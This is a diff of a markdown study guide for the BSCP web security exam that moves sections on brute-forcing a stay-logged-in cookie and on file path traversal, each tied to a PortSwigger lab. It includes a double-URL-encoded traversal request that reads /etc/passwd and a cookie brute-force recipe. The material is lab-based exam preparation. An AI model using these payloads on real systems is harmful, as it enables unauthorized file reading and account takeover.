@@ -7,7 +7,7 @@ The acronym BSCP has nice simular ring like OSCP  :)
 [Cross Site Scripting](#cross-site-scripting)  
 [Host Header Poison - forgot-password](#host-header-poison---forgot-password)  
 [HTTP Request Smuggling](#http-request-smuggling)  
-[Privilege Escalation JSON RoleId](#privesc-json-roleid)  
+[Privilege Escalation](#privilege-escalation)  
 [SQLi Data Exfiltration](#sql-injection-data-exfiltration)  
 [XML entities & Injections](#xxe-injections)  
 [SSRF Server side request forgery](#ssrf---server-side-request-forgery)  
@@ -15,7 +15,6 @@ The acronym BSCP has nice simular ring like OSCP  :)
 [Prototype pollution](#prototype-pollution)  
 [JSON Web Tokens](#jwt)  
 [Cross Site Request Forgery](#csrf)  
-[Brute force authentication](#brute-force-authentication)  
 [Focus target scanning](#focus-scanning)  
 [File path traversal](#file-path-traversal)  
 [Youtube Study Playlist](#youtube-training-playlist)  
@@ -429,6 +428,23 @@ Connection: close
 ![Attack identify Admin role ID](admin-roleid-privesc.png)  
 
 [PortSwigger Lab: User role can be modified in user profile](https://portswigger.net/web-security/access-control/lab-user-role-can-be-modified-in-user-profile)  
+
+
+
+### Brute Force Authentication  
+
+>Cookie value contain the password of the user logged in and is vulnerable to brute-forcing.  
+
+![brute](brute.png)  
+
+>Intruder Payload processing, add grep option and the rules in sequenctial order before attack is submitted. 1. Hash: MD5 2. Add prefix: wiener: 3. Encode: Base64-encode.
+
+```bash
+grep 'Update email'
+```  
+
+[PortSwigger Lab: Brute-forcing a stay-logged-in cookie](https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie)  
+  
 
 
 ## SQL Injection Data Exfiltration
@@ -1101,21 +1117,22 @@ Referrer-Policy: unsafe-url
 
 [PortSwigger Lab: CSRF with broken Referer validation](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-broken)  
 
+  
+## File Path Traversal
 
-## Brute Force Authentication  
+>The imagefile parameter is vulnerable to directory traversal path attacks, enabling read access to arbitrary files on the server.
 
->Cookie value contain the password of the user logged in and is vulnerable to brute-forcing.  
-
-![brute](brute.png)  
-
->Intruder Payload processing, add grep option and the rules in sequenctial order before attack is submitted. 1. Hash: MD5 2. Add prefix: wiener: 3. Encode: Base64-encode.
-
-```bash
-grep 'Update email'
+```html
+GET /admin_controls/metrics/admin-image?imagefile=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
 ```  
 
-[PortSwigger Lab: Brute-forcing a stay-logged-in cookie](https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie)  
+![URL encode path traverse](encode-path-traverse.png)  
+
+>Burp Intruder provides a predefined payload list (Fuzzing - path traversal).  
+
+[PortSwigger Lab: File path traversal, traversal sequences stripped with superfluous URL-decode](https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode)  
   
+
 
 ## Focus Scanning 
 
@@ -1132,20 +1149,6 @@ grep 'Update email'
 [PortSwigger Lab: Discovering vulnerabilities quickly with targeted scanning](https://portswigger.net/web-security/essential-skills/using-burp-scanner-during-manual-testing/lab-discovering-vulnerabilities-quickly-with-targeted-scanning)  
   
 
-## File Path Traversal
-
->The imagefile parameter is vulnerable to directory traversal path attacks, enabling read access to arbitrary files on the server.
-
-```html
-GET /admin_controls/metrics/admin-image?imagefile=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
-```  
-
-![URL encode path traverse](encode-path-traverse.png)  
-
->Burp Intruder provides a predefined payload list (Fuzzing - path traversal).  
-
-[PortSwigger Lab: File path traversal, traversal sequences stripped with superfluous URL-decode](https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode)  
-  
 
 ## YouTube Training Playlist 
   
